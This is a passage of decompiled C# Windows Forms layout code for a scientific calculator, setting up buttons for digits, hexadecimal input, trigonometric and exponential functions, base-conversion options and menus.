		((Control)btn_c_f).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_c_f).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_c_f).set_Location(new Point(71, 26));
		((Control)btn_c_f).set_Name("btn_c_f");
		((Control)btn_c_f).set_Size(new Size(45, 36));
		((Control)btn_c_f).set_TabIndex(35);
		((ButtonBase)btn_c_f).set_Text("toF");
		((ButtonBase)btn_c_f).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_f_c).set_BackColor(Color.Transparent);
		((ButtonBase)btn_f_c).set_FlatStyle((FlatStyle)1);
		((Control)btn_f_c).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_f_c).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_f_c).set_Location(new Point(25, 26));
		((Control)btn_f_c).set_Name("btn_f_c");
		((Control)btn_f_c).set_Size(new Size(45, 36));
		((Control)btn_f_c).set_TabIndex(34);
		((ButtonBase)btn_f_c).set_Text("toC");
		((ButtonBase)btn_f_c).set_UseVisualStyleBackColor(false);
		((Control)grp_basic).set_BackColor(Color.Transparent);
		((Control)grp_basic).get_Controls().Add((Control)(object)combo_memory);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_equal);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_decimal_point);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_1_2);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_addminus);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_mg);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_clear);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_mminus);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_mplus);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_back);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_divide);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_multiply);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_subtract);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_add);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_0);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_9);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_8);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_7);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_6);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_5);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_4);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_3);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_2);
		((Control)grp_basic).get_Controls().Add((Control)(object)btn_1);
		((Control)grp_basic).set_Location(new Point(31, 133));
		((Control)grp_basic).set_Name("grp_basic");
		((Control)grp_basic).set_Size(new Size(278, 236));
		((Control)grp_basic).set_TabIndex(41);
		grp_basic.set_TabStop(false);
		((ListControl)combo_memory).set_FormattingEnabled(true);
		((Control)combo_memory).set_Location(new Point(64, 57));
		((Control)combo_memory).set_Name("combo_memory");
		((Control)combo_memory).set_Size(new Size(164, 21));
		((Control)combo_memory).set_TabIndex(55);
		((ButtonBase)btn_equal).set_BackColor(Color.Transparent);
		((ButtonBase)btn_equal).set_FlatStyle((FlatStyle)1);
		((Control)btn_equal).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_equal).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_equal).set_Location(new Point(207, 182));
		((Control)btn_equal).set_Name("btn_equal");
		((Control)btn_equal).set_Size(new Size(45, 36));
		((Control)btn_equal).set_TabIndex(23);
		((ButtonBase)btn_equal).set_Text("=");
		((ButtonBase)btn_equal).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_decimal_point).set_BackColor(Color.Transparent);
		((ButtonBase)btn_decimal_point).set_FlatStyle((FlatStyle)1);
		((Control)btn_decimal_point).set_Font(new Font("Georgia", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btn_decimal_point).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_decimal_point).set_Location(new Point(161, 182));
		((Control)btn_decimal_point).set_Name("btn_decimal_point");
		((Control)btn_decimal_point).set_Size(new Size(45, 36));
		((Control)btn_decimal_point).set_TabIndex(22);
		((ButtonBase)btn_decimal_point).set_Text(".");
		((ButtonBase)btn_decimal_point).set_UseVisualStyleBackColor(false);
		((Control)grp_advance_top).set_BackColor(Color.Transparent);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_e_2);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_e_x);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)radio_degree);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_deg);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)radio_rad);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_rad);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_pi);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_exp);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_cot);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_sec);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_cosec);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_tan);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_cos);
		((Control)grp_advance_top).get_Controls().Add((Control)(object)btn_sin);
		((Control)grp_advance_top).set_Location(new Point(409, 62));
		((Control)grp_advance_top).set_Name("grp_advance_top");
		((Control)grp_advance_top).set_Size(new Size(234, 175));
		((Control)grp_advance_top).set_TabIndex(42);
		grp_advance_top.set_TabStop(false);
		((ButtonBase)btn_e_2).set_BackColor(Color.Transparent);
		((ButtonBase)btn_e_2).set_FlatStyle((FlatStyle)1);
		((Control)btn_e_2).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_e_2).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_e_2).set_Location(new Point(117, 93));
		((Control)btn_e_2).set_Name("btn_e_2");
		((Control)btn_e_2).set_Size(new Size(45, 36));
		((Control)btn_e_2).set_TabIndex(58);
		((ButtonBase)btn_e_2).set_Text("e^2");
		((ButtonBase)btn_e_2).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_e_x).set_BackColor(Color.Transparent);
		((ButtonBase)btn_e_x).set_FlatStyle((FlatStyle)1);
		((Control)btn_e_x).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_e_x).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_e_x).set_Location(new Point(71, 93));
		((Control)btn_e_x).set_Name("btn_e_x");
		((Control)btn_e_x).set_Size(new Size(45, 36));
		((Control)btn_e_x).set_TabIndex(57);
		((ButtonBase)btn_e_x).set_Text("e^x");
		((ButtonBase)btn_e_x).set_UseVisualStyleBackColor(false);
		((ButtonBase)radio_degree).set_AutoSize(true);
		((ButtonBase)radio_degree).set_BackColor(Color.Transparent);
		((Control)radio_degree).set_ForeColor(Color.WhiteSmoke);
		((Control)radio_degree).set_Location(new Point(125, 139));
		((Control)radio_degree).set_Name("radio_degree");
		((Control)radio_degree).set_Size(new Size(65, 17));
		((Control)radio_degree).set_TabIndex(56);
		radio_degree.set_TabStop(true);
		((ButtonBase)radio_degree).set_Text("Degrees");
		((ButtonBase)radio_degree).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_deg).set_BackColor(Color.Transparent);
		((ButtonBase)btn_deg).set_FlatStyle((FlatStyle)1);
		((Control)btn_deg).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_deg).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_deg).set_Location(new Point(163, 93));
		((Control)btn_deg).set_Name("btn_deg");
		((Control)btn_deg).set_Size(new Size(45, 36));
		((Control)btn_deg).set_TabIndex(34);
		((ButtonBase)btn_deg).set_Text("Deg");
		((ButtonBase)btn_deg).set_UseVisualStyleBackColor(false);
		((ButtonBase)radio_rad).set_AutoSize(true);
		((ButtonBase)radio_rad).set_BackColor(Color.Transparent);
		((Control)radio_rad).set_ForeColor(Color.WhiteSmoke);
		((Control)radio_rad).set_Location(new Point(51, 139));
		((Control)radio_rad).set_Name("radio_rad");
		((Control)radio_rad).set_Size(new Size(64, 17));
		((Control)radio_rad).set_TabIndex(55);
		radio_rad.set_TabStop(true);
		((ButtonBase)radio_rad).set_Text("Radians");
		((ButtonBase)radio_rad).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_rad).set_BackColor(Color.Transparent);
		((ButtonBase)btn_rad).set_FlatStyle((FlatStyle)1);
		((Control)btn_rad).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_rad).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_rad).set_Location(new Point(25, 93));
		((Control)btn_rad).set_Name("btn_rad");
		((Control)btn_rad).set_Size(new Size(45, 36));
		((Control)btn_rad).set_TabIndex(33);
		((ButtonBase)btn_rad).set_Text("Rad");
		((ButtonBase)btn_rad).set_UseVisualStyleBackColor(false);
		((Control)grp_advance_bottom).set_BackColor(Color.Transparent);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_x_1_y);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_log);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_x_3);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_ln);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_x_2);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_x_y);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_c_f);
		((Control)grp_advance_bottom).get_Controls().Add((Control)(object)btn_f_c);
		((Control)grp_advance_bottom).set_Location(new Point(409, 243));
		((Control)grp_advance_bottom).set_Name("grp_advance_bottom");
		((Control)grp_advance_bottom).set_Size(new Size(234, 126));
		((Control)grp_advance_bottom).set_TabIndex(43);
		grp_advance_bottom.set_TabStop(false);
		((ToolStripDropDownItem)FileToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)StandardToolStripMenuItem,
			(ToolStripItem)ScientificToolStripMenuItem,
			(ToolStripItem)BaseConversionToolStripMenuItem,
			(ToolStripItem)ToolStripMenuItem1,
			(ToolStripItem)QuitToolStripMenuItem
		});
		((ToolStripItem)FileToolStripMenuItem).set_ForeColor(Color.WhiteSmoke);
		((ToolStripItem)FileToolStripMenuItem).set_Name("FileToolStripMenuItem");
		((ToolStripItem)FileToolStripMenuItem).set_Size(new Size(47, 20));
		((ToolStripItem)FileToolStripMenuItem).set_Text("&View");
		((ToolStripItem)StandardToolStripMenuItem).set_Name("StandardToolStripMenuItem");
		((ToolStripItem)StandardToolStripMenuItem).set_Size(new Size(161, 22));
		((ToolStripItem)StandardToolStripMenuItem).set_Text("&Standard");
		((ToolStripItem)ScientificToolStripMenuItem).set_Name("ScientificToolStripMenuItem");
		((ToolStripItem)ScientificToolStripMenuItem).set_Size(new Size(161, 22));
		((ToolStripItem)ScientificToolStripMenuItem).set_Text("&Scientific");
		((ToolStripItem)BaseConversionToolStripMenuItem).set_Name("BaseConversionToolStripMenuItem");
		((ToolStripItem)BaseConversionToolStripMenuItem).set_Size(new Size(161, 22));
		((ToolStripItem)BaseConversionToolStripMenuItem).set_Text("&Base Conversion");
		((ToolStripItem)ToolStripMenuItem1).set_Name("ToolStripMenuItem1");
		((ToolStripItem)ToolStripMenuItem1).set_Size(new Size(158, 6));
		((ToolStripItem)QuitToolStripMenuItem).set_Name("QuitToolStripMenuItem");
		((ToolStripItem)QuitToolStripMenuItem).set_Size(new Size(161, 22));
		((ToolStripItem)QuitToolStripMenuItem).set_Text("&Quit");
		((ToolStripDropDownItem)EditToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)CopyToolStripMenuItem,
			(ToolStripItem)PasteToolStripMenuItem,
			(ToolStripItem)ToolStripMenuItem2,
			(ToolStripItem)OptionToolStripMenuItem
		});
		((ToolStripItem)EditToolStripMenuItem).set_ForeColor(Color.WhiteSmoke);
		((ToolStripItem)EditToolStripMenuItem).set_Name("EditToolStripMenuItem");
		((ToolStripItem)EditToolStripMenuItem).set_Size(new Size(42, 20));
		((ToolStripItem)EditToolStripMenuItem).set_Text("&Edit");
		((ToolStripItem)CopyToolStripMenuItem).set_Name("CopyToolStripMenuItem");
		((ToolStripItem)CopyToolStripMenuItem).set_Size(new Size(111, 22));
		((ToolStripItem)CopyToolStripMenuItem).set_Text("&Copy");
		((ToolStripItem)PasteToolStripMenuItem).set_Name("PasteToolStripMenuItem");
		((ToolStripItem)PasteToolStripMenuItem).set_Size(new Size(111, 22));
		((ToolStripItem)PasteToolStripMenuItem).set_Text("&Paste");
		((ToolStripItem)ToolStripMenuItem2).set_Name("ToolStripMenuItem2");
		((ToolStripItem)ToolStripMenuItem2).set_Size(new Size(108, 6));
		((ToolStripItem)OptionToolStripMenuItem).set_Name("OptionToolStripMenuItem");
		((ToolStripItem)OptionToolStripMenuItem).set_Size(new Size(111, 22));
		((ToolStripItem)OptionToolStripMenuItem).set_Text("&Option");
		((ToolStripDropDownItem)HelpToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)HistoryToolStripMenuItem,
			(ToolStripItem)AboutMeToolStripMenuItem
		});
		((ToolStripItem)HelpToolStripMenuItem).set_ForeColor(Color.WhiteSmoke);
		((ToolStripItem)HelpToolStripMenuItem).set_Name("HelpToolStripMenuItem");
		((ToolStripItem)HelpToolStripMenuItem).set_Size(new Size(47, 20));
		((ToolStripItem)HelpToolStripMenuItem).set_Text("&Help");
		((ToolStripItem)HistoryToolStripMenuItem).set_Name("HistoryToolStripMenuItem");
		((ToolStripItem)HistoryToolStripMenuItem).set_Size(new Size(127, 22));
		((ToolStripItem)HistoryToolStripMenuItem).set_Text("&History");
		((ToolStripItem)AboutMeToolStripMenuItem).set_Name("AboutMeToolStripMenuItem");
		((ToolStripItem)AboutMeToolStripMenuItem).set_Size(new Size(127, 22));
		((ToolStripItem)AboutMeToolStripMenuItem).set_Text("&About me");
		((ButtonBase)radio_binary).set_AutoSize(true);
		((ButtonBase)radio_binary).set_BackColor(Color.Transparent);
		((Control)radio_binary).set_Font(new Font("Georgia", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radio_binary).set_ForeColor(Color.WhiteSmoke);
		((Control)radio_binary).set_Location(new Point(131, 19));
		((Control)radio_binary).set_Name("radio_binary");
		((Control)radio_binary).set_Size(new Size(66, 20));
		((Control)radio_binary).set_TabIndex(46);
		radio_binary.set_TabStop(true);
		((ButtonBase)radio_binary).set_Text("Binary");
		((ButtonBase)radio_binary).set_UseVisualStyleBackColor(false);
		((ButtonBase)radio_decimal).set_AutoSize(true);
		((ButtonBase)radio_decimal).set_BackColor(Color.Transparent);
		((Control)radio_decimal).set_Font(new Font("Georgia", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radio_decimal).set_ForeColor(Color.WhiteSmoke);
		((Control)radio_decimal).set_Location(new Point(49, 19));
		((Control)radio_decimal).set_Name("radio_decimal");
		((Control)radio_decimal).set_Size(new Size(75, 20));
		((Control)radio_decimal).set_TabIndex(47);
		radio_decimal.set_TabStop(true);
		((ButtonBase)radio_decimal).set_Text("Decimal");
		((ButtonBase)radio_decimal).set_UseVisualStyleBackColor(false);
		((ButtonBase)radio_octal).set_AutoSize(true);
		((ButtonBase)radio_octal).set_BackColor(Color.Transparent);
		((Control)radio_octal).set_Font(new Font("Georgia", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radio_octal).set_ForeColor(Color.WhiteSmoke);
		((Control)radio_octal).set_Location(new Point(49, 42));
		((Control)radio_octal).set_Name("radio_octal");
		((Control)radio_octal).set_Size(new Size(57, 20));
		((Control)radio_octal).set_TabIndex(48);
		radio_octal.set_TabStop(true);
		((ButtonBase)radio_octal).set_Text("Octal");
		((ButtonBase)radio_octal).set_UseVisualStyleBackColor(false);
		((ButtonBase)radio_hexadecimal).set_AutoSize(true);
		((ButtonBase)radio_hexadecimal).set_BackColor(Color.Transparent);
		((Control)radio_hexadecimal).set_Font(new Font("Georgia", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)radio_hexadecimal).set_ForeColor(Color.WhiteSmoke);
		((Control)radio_hexadecimal).set_Location(new Point(131, 42));
		((Control)radio_hexadecimal).set_Name("radio_hexadecimal");
		((Control)radio_hexadecimal).set_Size(new Size(110, 20));
		((Control)radio_hexadecimal).set_TabIndex(49);
		radio_hexadecimal.set_TabStop(true);
		((ButtonBase)radio_hexadecimal).set_Text("Hexa Decimal");
		((ButtonBase)radio_hexadecimal).set_UseVisualStyleBackColor(false);
		((Control)grp_conversion).set_BackColor(Color.Transparent);
		((Control)grp_conversion).get_Controls().Add((Control)(object)radio_hexadecimal);
		((Control)grp_conversion).get_Controls().Add((Control)(object)radio_octal);
		((Control)grp_conversion).get_Controls().Add((Control)(object)radio_decimal);
		((Control)grp_conversion).get_Controls().Add((Control)(object)radio_binary);
		((Control)grp_conversion).set_Location(new Point(385, 466));
		((Control)grp_conversion).set_Name("grp_conversion");
		((Control)grp_conversion).set_Size(new Size(278, 77));
		((Control)grp_conversion).set_TabIndex(50);
		grp_conversion.set_TabStop(false);
		((ButtonBase)btn_c).set_BackColor(Color.Transparent);
		((ButtonBase)btn_c).set_FlatStyle((FlatStyle)1);
		((Control)btn_c).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_c).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_c).set_Location(new Point(480, 419));
		((Control)btn_c).set_Name("btn_c");
		((Control)btn_c).set_Size(new Size(45, 36));
		((Control)btn_c).set_TabIndex(26);
		((ButtonBase)btn_c).set_Text("C");
		((ButtonBase)btn_c).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_b).set_BackColor(Color.Transparent);
		((ButtonBase)btn_b).set_FlatStyle((FlatStyle)1);
		((Control)btn_b).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_b).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_b).set_Location(new Point(434, 419));
		((Control)btn_b).set_Name("btn_b");
		((Control)btn_b).set_Size(new Size(45, 36));
		((Control)btn_b).set_TabIndex(25);
		((ButtonBase)btn_b).set_Text("B");
		((ButtonBase)btn_b).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_a).set_BackColor(Color.Transparent);
		((ButtonBase)btn_a).set_FlatStyle((FlatStyle)1);
		((Control)btn_a).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_a).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_a).set_Location(new Point(388, 419));
		((Control)btn_a).set_Name("btn_a");
		((Control)btn_a).set_Size(new Size(45, 36));
		((Control)btn_a).set_TabIndex(24);
		((ButtonBase)btn_a).set_Text("A");
		((ButtonBase)btn_a).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_e).set_BackColor(Color.Transparent);
		((ButtonBase)btn_e).set_FlatStyle((FlatStyle)1);
		((Control)btn_e).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_e).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_e).set_Location(new Point(572, 419));
		((Control)btn_e).set_Name("btn_e");
		((Control)btn_e).set_Size(new Size(45, 36));
		((Control)btn_e).set_TabIndex(23);
		((ButtonBase)btn_e).set_Text("E");
		((ButtonBase)btn_e).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_d).set_BackColor(Color.Transparent);
		((ButtonBase)btn_d).set_FlatStyle((FlatStyle)1);
		((Control)btn_d).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_d).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_d).set_Location(new Point(526, 419));
		((Control)btn_d).set_Name("btn_d");
		((Control)btn_d).set_Size(new Size(45, 36));
		((Control)btn_d).set_TabIndex(22);
		((ButtonBase)btn_d).set_Text("D");
		((ButtonBase)btn_d).set_UseVisualStyleBackColor(false);
		((Control)txtmain).set_Font(new Font("Cambria", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)txtmain).set_Location(new Point(31, 92));
		((Control)txtmain).set_Name("txtmain");
		((Control)txtmain).set_Size(new Size(278, 36));
		((Control)txtmain).set_TabIndex(0);
		txtmain.set_Text("0");
		((ButtonBase)btn_f).set_BackColor(Color.Transparent);
		((ButtonBase)btn_f).set_FlatStyle((FlatStyle)1);
		((Control)btn_f).set_Font(new Font("Georgia", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_f).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_f).set_Location(new Point(618, 419));
		((Control)btn_f).set_Name("btn_f");
		((Control)btn_f).set_Size(new Size(45, 36));
		((Control)btn_f).set_TabIndex(55);
		((ButtonBase)btn_f).set_Text("F");
		((ButtonBase)btn_f).set_UseVisualStyleBackColor(false);
		((ToolStrip)MenuStrip1).set_BackColor(Color.Transparent);
		((ToolStrip)MenuStrip1).set_Dock((DockStyle)0);
		((ToolStrip)MenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)AvatorToolStripMenuItem,
			(ToolStripItem)EditToolStripMenuItem1,
			(ToolStripItem)HelpToolStripMenuItem1
		});
		((Control)MenuStrip1).set_Location(new Point(9, 9));
		((Control)MenuStrip1).set_Name("MenuStrip1");
		((Control)MenuStrip1).set_Size(new Size(255, 24));
		((Control)MenuStrip1).set_TabIndex(56);
		((Control)MenuStrip1).set_Text("MenuStrip1");
		((ToolStripDropDownItem)AvatorToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[5]
		{
			(ToolStripItem)StandardToolStripMenuItem1,
			(ToolStripItem)ScientificToolStripMenuItem1,
			(ToolStripItem)ConversionToolStripMenuItem,
			(ToolStripItem)ToolStripMenuItem3,
			(ToolStripItem)QuitToolStripMenuItem1
		});
		((ToolStripItem)AvatorToolStripMenuItem).set_Name("AvatorToolStripMenuItem");
		((ToolStripItem)AvatorToolStripMenuItem).set_Size(new Size(44, 20));
		((ToolStripItem)AvatorToolStripMenuItem).set_Text("&View");
		((ToolStripItem)StandardToolStripMenuItem1).set_Name("StandardToolStripMenuItem1");
		((ToolStripItem)StandardToolStripMenuItem1).set_Size(new Size(134, 22));
		((ToolStripItem)StandardToolStripMenuItem1).set_Text("&Standard");
		((ToolStripItem)ScientificToolStripMenuItem1).set_Name("ScientificToolStripMenuItem1");
		((ToolStripItem)ScientificToolStripMenuItem1).set_Size(new Size(134, 22));
		((ToolStripItem)ScientificToolStripMenuItem1).set_Text("&Scientific");
		((ToolStripItem)ConversionToolStripMenuItem).set_Name("ConversionToolStripMenuItem");
		((ToolStripItem)ConversionToolStripMenuItem).set_Size(new Size(134, 22));
		((ToolStripItem)ConversionToolStripMenuItem).set_Text("&Conversion");
		((ToolStripItem)ToolStripMenuItem3).set_Name("ToolStripMenuItem3");
		((ToolStripItem)ToolStripMenuItem3).set_Size(new Size(131, 6));
		((ToolStripItem)QuitToolStripMenuItem1).set_Name("QuitToolStripMenuItem1");
		((ToolStripItem)QuitToolStripMenuItem1).set_Size(new Size(134, 22));
		((ToolStripItem)QuitToolStripMenuItem1).set_Text("Quit");
		((ToolStripDropDownItem)EditToolStripMenuItem1).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[6]
		{
			(ToolStripItem)CopyToolStripMenuItem1,
			(ToolStripItem)PasteToolStripMenuItem1,
			(ToolStripItem)ToolStripMenuItem4,
			(ToolStripItem)SelectAllToolStripMenuItem,
			(ToolStripItem)ToolStripMenuItem5,
			(ToolStripItem)OptionToolStripMenuItem1
		});
		((ToolStripItem)EditToolStripMenuItem1).set_Name("EditToolStripMenuItem1");
		((ToolStripItem)EditToolStripMenuItem1).set_Size(new Size(39, 20));
		((ToolStripItem)EditToolStripMenuItem1).set_Text("&Edit");
		((ToolStripItem)CopyToolStripMenuItem1).set_Name("CopyToolStripMenuItem1");
		((ToolStripItem)CopyToolStripMenuItem1).set_Size(new Size(122, 22));
		((ToolStripItem)CopyToolStripMenuItem1).set_Text("&Copy");
		((ToolStripItem)PasteToolStripMenuItem1).set_Name("PasteToolStripMenuItem1");
		((ToolStripItem)PasteToolStripMenuItem1).set_Size(new Size(122, 22));
		((ToolStripItem)PasteToolStripMenuItem1).set_Text("&Paste");
		((ToolStripItem)ToolStripMenuItem4).set_Name("ToolStripMenuItem4");
		((ToolStripItem)ToolStripMenuItem4).set_Size(new Size(119, 6));
		((ToolStripItem)SelectAllToolStripMenuItem).set_Name("SelectAllToolStripMenuItem");
		((ToolStripItem)SelectAllToolStripMenuItem).set_Size(new Size(122, 22));
		((ToolStripItem)SelectAllToolStripMenuItem).set_Text("&Select All");
		((ToolStripItem)ToolStripMenuItem5).set_Name("ToolStripMenuItem5");
		((ToolStripItem)ToolStripMenuItem5).set_Size(new Size(119, 6));
		((ToolStripItem)OptionToolStripMenuItem1).set_Name("OptionToolStripMenuItem1");
		((ToolStripItem)OptionToolStripMenuItem1).set_Size(new Size(122, 22));
		((ToolStripItem)OptionToolStripMenuItem1).set_Text("&Option");
		((ToolStripDropDownItem)HelpToolStripMenuItem1).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)HelpMeToolStripMenuItem,
			(ToolStripItem)AboutToolStripMenuItem
		});
		((ToolStripItem)HelpToolStripMenuItem1).set_Name("HelpToolStripMenuItem1");
		((ToolStripItem)HelpToolStripMenuItem1).set_Size(new Size(44, 20));
		((ToolStripItem)HelpToolStripMenuItem1).set_Text("&Help");
		((ToolStripItem)HelpMeToolStripMenuItem).set_Name("HelpMeToolStripMenuItem");
		((ToolStripItem)HelpMeToolStripMenuItem).set_Size(new Size(125, 22));
		((ToolStripItem)HelpMeToolStripMenuItem).set_Text("&Help Me.!");
		((ToolStripItem)AboutToolStripMenuItem).set_Name("AboutToolStripMenuItem");
		((ToolStripItem)AboutToolStripMenuItem).set_Size(new Size(125, 22));
		((ToolStripItem)AboutToolStripMenuItem).set_Text("&About");
		((ToolStrip)cms_1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)cms_close,
			(ToolStripItem)ToolStripMenuItem6,
			(ToolStripItem)cms_about
		});
		((Control)cms_1).set_Name("cms_1");
		((Control)cms_1).set_Size(new Size(108, 54));
		((ToolStripItem)cms_close).set_Name("cms_close");
		((ToolStripItem)cms_close).set_Size(new Size(107, 22));
		((ToolStripItem)cms_close).set_Text("Close");
		((ToolStripItem)ToolStripMenuItem6).set_Name("ToolStripMenuItem6");
		((ToolStripItem)ToolStripMenuItem6).set_Size(new Size(104, 6));
		((ToolStripItem)cms_about).set_Name("cms_about");
		((ToolStripItem)cms_about).set_Size(new Size(107, 22));
		((ToolStripItem)cms_about).set_Text("About");
		((ListControl)cmb_box_unit).set_FormattingEnabled(true);
		((Control)cmb_box_unit).set_Location(new Point(31, 450));
		((Control)cmb_box_unit).set_Name("cmb_box_unit");
		((Control)cmb_box_unit).set_Size(new Size(173, 21));
		((Control)cmb_box_unit).set_TabIndex(57);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_ForeColor(Color.WhiteSmoke);
		((Control)Label1).set_Location(new Point(28, 432));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(80, 13));
		((Control)Label1).set_TabIndex(58);
		Label1.set_Text("Unit Converting");
		((ButtonBase)btn_n).set_BackColor(Color.Transparent);
		((ButtonBase)btn_n).set_FlatStyle((FlatStyle)1);
		((Control)btn_n).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_n).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_n).set_Location(new Point(14, 17));
		((Control)btn_n).set_Name("btn_n");
		((Control)btn_n).set_Size(new Size(45, 36));
		((Control)btn_n).set_TabIndex(41);
		((ButtonBase)btn_n).set_Text("n!");
		((ButtonBase)btn_n).set_UseVisualStyleBackColor(false);
		((Control)grp_algebra).set_BackColor(Color.Transparent);
		((Control)grp_algebra).get_Controls().Add((Control)(object)btn_ncr);
		((Control)grp_algebra).get_Controls().Add((Control)(object)btn_sigma_n1);
		((Control)grp_algebra).get_Controls().Add((Control)(object)btn_sigma_nr);
		((Control)grp_algebra).get_Controls().Add((Control)(object)btn_n);
		((Control)grp_algebra).set_Location(new Point(27, 477));
		((Control)grp_algebra).set_Name("grp_algebra");
		((Control)grp_algebra).set_Size(new Size(281, 65));
		((Control)grp_algebra).set_TabIndex(59);
		grp_algebra.set_TabStop(false);
		((ButtonBase)btn_ncr).set_BackColor(Color.Transparent);
		((ButtonBase)btn_ncr).set_FlatStyle((FlatStyle)1);
		((Control)btn_ncr).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_ncr).set_ForeColor(Color.WhiteSmoke);
